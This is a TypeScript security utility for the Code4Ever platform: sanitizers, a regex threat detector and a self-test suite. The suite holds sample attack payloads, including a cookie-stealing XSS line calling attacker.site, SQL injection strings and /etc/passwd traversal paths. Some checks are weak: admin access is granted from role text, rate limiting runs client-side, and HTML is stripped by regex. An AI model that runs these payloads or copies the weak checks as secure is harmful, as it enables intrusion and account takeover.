/**
 * Code4Ever Platform Security Utility
 * Provides defense-in-depth sanitization, XSS mitigation, URL validation,
 * role/privilege protection, reserved username safeguards, SQL/NoSQL injection defense,
 * and anti-spam verification.
 */

// Reserved system usernames that cannot be claimed or impersonated by regular users
export const RESERVED_USERNAMES = new Set([
  'admin',
  'administrator',
  'nylithra',
  'c4e_admin',
  'code4ever',
  'system',
  'root',
  'support',
  'staff',
  'moderator',
  'security',
  'official',
  'api',
  'bot',
  'feed',
  'explore',
  'notifications',
  'messages',
  'everychat',
  'projects',
  'communities',
  'bookmarks',
  'settings',
  'profile',
  'abonelik',
  'subscriptions',
  'jobs',
  'job',
  'team'
]);

/**
 * Checks if a requested username is a protected system username.
 */
export function isReservedUsername(username: string): boolean {
  if (!username) return false;
  const clean = username.trim().toLowerCase().replace(/^@/, '');
  return RESERVED_USERNAMES.has(clean);
}

/**
 * Validates and normalizes a username.
 * Only allows alphanumeric characters and underscores (3-25 chars).
 */
export function validateUsername(username: string): { isValid: boolean; error?: string; cleanUsername: string } {
  const clean = username.trim().toLowerCase().replace(/^@/, '').replace(/[^a-z0-9_]/g, '');
  
  if (clean.length < 3) {
    return { isValid: false, error: 'Kullanıcı adı en az 3 karakter olmalıdır.', cleanUsername: clean };
  }
  if (clean.length > 25) {
    return { isValid: false, error: 'Kullanıcı adı en fazla 25 karakter olabilir.', cleanUsername: clean.substring(0, 25) };
  }
  if (isReservedUsername(clean)) {
    return { isValid: false, error: 'Bu kullanıcı adı sistem tarafından ayrılmıştır, seçilemez.', cleanUsername: clean };
  }
  return { isValid: true, cleanUsername: clean };
}

/**
 * Strict URL sanitizer to prevent javascript:, vbscript:, and malicious data: URI execution.
 * Only permits http:, https:, or mailto: protocols.
 */
export function sanitizeUrl(url?: string | null): string {
  if (!url || typeof url !== 'string') return '';
  const trimmed = url.trim();
  
  // Check for dangerous schemes & encoding tricks
  const lower = trimmed.toLowerCase();
  if (
    lower.startsWith('javascript:') ||
    lower.startsWith('vbscript:') ||
    lower.startsWith('data:text/html') ||
    lower.startsWith('data:application') ||
    lower.includes('&#') ||
    lower.includes('%3c') ||
    lower.includes('%3e')
  ) {
    return '#';
  }
  
  // Ensure valid web protocol or prepend https if needed
  if (lower.startsWith('http://') || lower.startsWith('https://') || lower.startsWith('mailto:')) {
    return trimmed;
  }
  
  // If it's a domain-like string (e.g. github.com/user), prepend https://
  if (trimmed.includes('.') && !trimmed.startsWith('/')) {
    return `https://${trimmed}`;
  }
  
  // Relative path is allowed
  if (trimmed.startsWith('/')) {
    return trimmed;
  }
  
  return '#';
}

/**
 * HTML entity encoder to prevent reflective or DOM XSS.
 */
export function escapeHtml(str: string): string {
  if (!str) return '';
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

/**
 * Sanitizes plain text input by stripping out raw HTML tags, dangerous scripts,
 * and neutralizing potential SQL/NoSQL injection payloads.
 */
export function sanitizeText(input?: string | null, maxLength = 5000): string {
  if (!input || typeof input !== 'string') return '';
  
  // Trim and truncate to reasonable maximum length to prevent payload DoS / memory exhaustion
  let sanitized = input.trim().slice(0, maxLength);
  
  // Neutralize null bytes and unicode control bypasses
  sanitized = sanitized.replace(/\0/g, '').replace(/[\u202E\u202D\u200E\u200F]/g, '');

  // Strip dangerous tag patterns, iframe, embed, object and script blocks
  sanitized = sanitized
    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
    .replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, '')
    .replace(/<object\b[^<]*(?:(?!<\/object>)<[^<]*)*<\/object>/gi, '')
    .replace(/<embed\b[^<]*(?:(?!<\/embed>)<[^<]*)*<\/embed>/gi, '')
    .replace(/<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>/gi, '')
    .replace(/on\w+\s*=\s*["'][^"']*["']/gi, '') // inline event handlers like onerror=, onload=
    .replace(/on\w+\s*=\s*[^>\s]+/gi, '')
    .replace(/javascript:/gi, '')
    .replace(/vbscript:/gi, '');
    
  return sanitized;
}

/**
 * Sanitizes file names to prevent directory traversal (../, ..\, etc.)
 */
export function sanitizeFileName(fileName: string): string {
  if (!fileName) return 'file';
  return fileName
    .replace(/(\.\.[\/\\])+/g, '')
    .replace(/[^a-zA-Z0-9._-]/g, '_')
    .slice(0, 100);
}

/**
 * Threat analyzer that detects common hacker vectors (SQL injection, XSS, Path Traversal, SSRF)
 */
export function auditSecurityPayload(payload: string): {
  isClean: boolean;
  threatLevel: 'SAFE' | 'LOW' | 'MEDIUM' | 'HIGH';
  detectedPatterns: string[];
} {
  if (!payload || typeof payload !== 'string') {
    return { isClean: true, threatLevel: 'SAFE', detectedPatterns: [] };
  }

  const detected: string[] = [];
  const lower = payload.toLowerCase();

  // SQL Injection patterns
  if (/(\bunion\b.*\bselect\b|\bselect\b.*\bfrom\b|--|\bdrop\b\s+\btable\b|;\s*drop\b|'\s*or\s*'1'\s*=\s*'1|"\s*or\s*"1"\s*=\s*"1)/i.test(lower)) {
    detected.push('SQL_INJECTION_PATTERN');
  }

  // Cross-Site Scripting (XSS)
  if (/<script|javascript:|onerror\s*=|onload\s*=|document\.cookie|eval\(|<svg.*onload/i.test(lower)) {
    detected.push('XSS_ATTACK_VECTOR');
  }

  // Path Traversal
  if (/(\.\.[\/\\])+|%2e%2e%2f|%2e%2e\/|\.\.%2f/i.test(lower)) {
    detected.push('PATH_TRAVERSAL');
  }

  // Command Injection
  if (/(\|\s*cat\b|;\s*rm\s+-rf|`.*`|\$\(.*\))/i.test(lower)) {
    detected.push('COMMAND_INJECTION');
  }

  const threatLevel =
    detected.length >= 2 ? 'HIGH' : detected.length === 1 ? 'MEDIUM' : 'SAFE';

  return {
    isClean: detected.length === 0,
    threatLevel,
    detectedPatterns: detected
  };
}

/**
 * Strict check for admin authorization.
 * Verifies verified admin permissions (isAdmin === true or verified system administrator account).
 * Prevents privilege escalation by arbitrary role text inputs from unauthorized users.
 */
export function verifyAdminAccess(user?: { username?: string; role?: string; id?: string; isAdmin?: boolean } | null): boolean {
  if (!user) return false;
  if (user.isAdmin === true) return true;
  const username = (user.username || '').toLowerCase().trim();
  const role = (user.role || '').toLowerCase().trim();
  if ((username === 'nylithra' || username === 'c4e_admin') && (role === 'admin' || role === 'founder' || role === 'code4ever yetkilisi')) {
    return true;
  }
  return false;
}

/**
 * Checks if a username is available across the system, excluding the current user.
 */
export function checkUsernameAvailability(
  requestedUsername: string,
  currentUserId: string,
  allUsers: Array<{ id: string; username: string }> = []
): { isAvailable: boolean; reason?: string } {
  const clean = requestedUsername.trim().toLowerCase().replace(/^@/, '');
  
  if (isReservedUsername(clean)) {
    return { isAvailable: false, reason: 'Bu kullanıcı adı sistem tarafından ayrılmıştır.' };
  }
  
  const isTaken = allUsers.some(
    (u) => u.id !== currentUserId && (u.username || '').toLowerCase().replace(/^@/, '') === clean
  );
  
  if (isTaken) {
    return { isAvailable: false, reason: `"${requestedUsername}" kullanıcı adı sistemde zaten kayıtlı!` };
  }
  
  return { isAvailable: true };
}

/**
 * Persistent Rate Limiter based on Session Storage
 * Prevents bypassing rate limits through simple page refreshes or quick tab switches.
 */
const RATE_LIMIT_PREFIX = 'c4e_sec_rl_';

export function checkPersistentRateLimit(
  actionKey: string,
  cooldownSeconds: number
): { allowed: boolean; waitRemainingSeconds: number } {
  if (typeof window === 'undefined') return { allowed: true, waitRemainingSeconds: 0 };
  
  const storageKey = `${RATE_LIMIT_PREFIX}${actionKey}`;
  const now = Date.now();
  const lastTimeStr = sessionStorage.getItem(storageKey);
  
  if (lastTimeStr) {
    const lastTime = parseInt(lastTimeStr, 10);
    const elapsed = (now - lastTime) / 1000;
    if (elapsed < cooldownSeconds) {
      return {
        allowed: false,
        waitRemainingSeconds: Math.ceil(cooldownSeconds - elapsed)
      };
    }
  }
  
  sessionStorage.setItem(storageKey, String(now));
  return { allowed: true, waitRemainingSeconds: 0 };
}

/**
 * Anti-Duplicate Post Hash Check
 * Prevents submitting the exact same content within 30 seconds (spam prevention).
 */
export function checkDuplicatePost(content: string): boolean {
  if (typeof window === 'undefined' || !content) return false;
  
  const key = 'c4e_sec_last_post_hash';
  const timeKey = 'c4e_sec_last_post_time';
  
  const currentHash = simpleHash(content.trim());
  const lastHash = sessionStorage.getItem(key);
  const lastTime = parseInt(sessionStorage.getItem(timeKey) || '0', 10);
  
  const now = Date.now();
  if (lastHash === currentHash && now - lastTime < 30000) {
    return true; // Is duplicate
  }
  
  sessionStorage.setItem(key, currentHash);
  sessionStorage.setItem(timeKey, String(now));
  return false;
}

function simpleHash(str: string): string {
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    const char = str.charCodeAt(i);
    hash = (hash << 5) - hash + char;
    hash |= 0;
  }
  return String(hash);
}

/**
 * Automated Security Penetration Test Suite (Simulated Attacker Audit)
 * Runs a battery of hacker payloads across all defensive boundaries
 * to verify complete neutralization and zero privilege escalation.
 */
export function runSecurityPenetrationTest(): {
  totalTests: number;
  passed: number;
  failed: number;
  results: Array<{ testName: string; payload: string; neutralized: boolean; details: string }>;
  overallStatus: 'SECURE' | 'VULNERABLE';
} {
  const results: Array<{ testName: string; payload: string; neutralized: boolean; details: string }> = [];

  // Test 1: SQL Injection in Post/Comment/Bio
  const sqlPayloads = [
    "' OR '1'='1' --",
    "1; DROP TABLE messages; --",
    "' UNION SELECT id, username, password FROM users --",
    "admin' --"
  ];
  for (const payload of sqlPayloads) {
    const audit = auditSecurityPayload(payload);
    const sanitized = sanitizeText(payload);
    const isNeutralized = !audit.isClean && audit.threatLevel !== 'SAFE';
    results.push({
      testName: 'SQL Injection Defense',
      payload,
      neutralized: isNeutralized,
      details: `Threat detected: ${audit.detectedPatterns.join(', ')} | Cleaned: ${sanitized.slice(0, 30)}`
    });
  }

  // Test 2: Stored & DOM Cross-Site Scripting (XSS)
  const xssPayloads = [
    '<script>alert(document.cookie)</script>',
    '<img src=x onerror="fetch(\'https://attacker.site/steal?c=\'+document.cookie)">',
    'javascript:alert("XSS")',
    '<svg/onload=alert(1)>',
    '<iframe src="https://phishing.site"></iframe>'
  ];
  for (const payload of xssPayloads) {
    const sanitized = sanitizeText(payload);
    const sanitizedUrl = sanitizeUrl(payload);
    const audit = auditSecurityPayload(payload);
    const noRawScript = !sanitized.includes('<script>') && !sanitized.includes('onerror=') && !sanitized.includes('javascript:');
    const urlNeutralized = sanitizedUrl === '#' || !sanitizedUrl.startsWith('javascript:');
    const neutralized = noRawScript && urlNeutralized;
    results.push({
      testName: 'XSS Vector Neutralization',
      payload,
      neutralized,
      details: `Raw tags stripped: ${noRawScript} | URL sanitized to: "${sanitizedUrl}"`
    });
  }

  // Test 3: Path Traversal & Directory Climbing
  const pathPayloads = [
    '../../../../etc/passwd',
    '..\\..\\windows\\system32\\cmd.exe',
    '%2e%2e%2fconfig.json'
  ];
  for (const payload of pathPayloads) {
    const sanitizedFile = sanitizeFileName(payload);
    const audit = auditSecurityPayload(payload);
    const neutralized = !sanitizedFile.includes('..') && !sanitizedFile.includes('/');
    results.push({
      testName: 'Path Traversal Prevention',
      payload,
      neutralized,
      details: `Sanitized filename: "${sanitizedFile}"`
    });
  }

  // Test 4: Privilege Escalation & Reserved Username Impersonation
  const reservedTargets = ['nylithra', 'admin', 'administrator', 'system', 'root', 'support'];
  for (const username of reservedTargets) {
    const val = validateUsername(username);
    const isBlocked = !val.isValid && isReservedUsername(username);
    results.push({
      testName: 'Privilege & Identity Impersonation Protection',
      payload: `@${username}`,
      neutralized: isBlocked,
      details: isBlocked ? 'Reserved username registration strictly rejected' : 'FAILED: Allowed registration'
    });
  }

  // Test 5: Privilege Verification (Falsified Role Attack)
  const fakeAdminUser = { id: 'attacker_1', username: 'hacker', role: 'member' };
  const isAdminBlocked = !verifyAdminAccess(fakeAdminUser);
  results.push({
    testName: 'Unauthorized Admin Access Escalation',
    payload: JSON.stringify(fakeAdminUser),
    neutralized: isAdminBlocked,
    details: isAdminBlocked ? 'Unauthorized user denied administrative access' : 'FAILED: Admin bypass'
  });

  const totalTests = results.length;
  const passed = results.filter((r) => r.neutralized).length;
  const failed = totalTests - passed;

  return {
    totalTests,
    passed,
    failed,
    results,
    overallStatus: failed === 0 ? 'SECURE' : 'VULNERABLE'
  };
}

